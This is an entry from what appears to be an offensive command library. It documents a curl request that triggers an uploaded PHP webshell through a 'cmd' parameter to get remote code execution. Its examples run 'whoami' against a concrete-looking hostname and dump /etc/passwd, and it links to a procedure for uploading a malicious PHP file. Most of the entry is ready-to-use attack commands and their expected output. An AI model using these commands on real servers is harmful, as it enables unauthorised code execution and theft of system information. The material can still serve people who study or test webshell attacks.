---
id: cmd-curl-execute-php-001
data: 'curl "http://target.com/uploads/shell.php?cmd=id"'
tags:
  - rce
  - execution
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:25.054Z'
verified: false
validated: true
submitted: true
---
# curl-execute-php

## Command

```bash
curl "http://target.com/uploads/shell.php?cmd=id"
```

## Description

This command triggers the execution of an uploaded PHP webshell by sending a GET request with a command parameter, resulting in remote code execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://target.com/uploads/shell.php` | URL path to the uploaded PHP file | Yes |
| `?cmd=id` | Query parameter passing the command to execute (e.g., 'id' for user info) | Yes |

## Examples

### Basic Usage

```bash
curl "http://axa.dxi.eu/uploads/shell.php?cmd=whoami"
```

### Advanced Usage

```bash
curl "http://target.com/uploads/shell.php?cmd=cat /etc/passwd" -o output.txt
```

## Expected Output

Direct output from the executed command, such as "uid=33(www-data) gid=33(www-data) groups=33(www-data)" for 'id', confirming server-side execution.

## Related

- [[commands/curl-php-upload]]
- [[procedures/Upload-Malicious-PHP-File-for-RCE]]
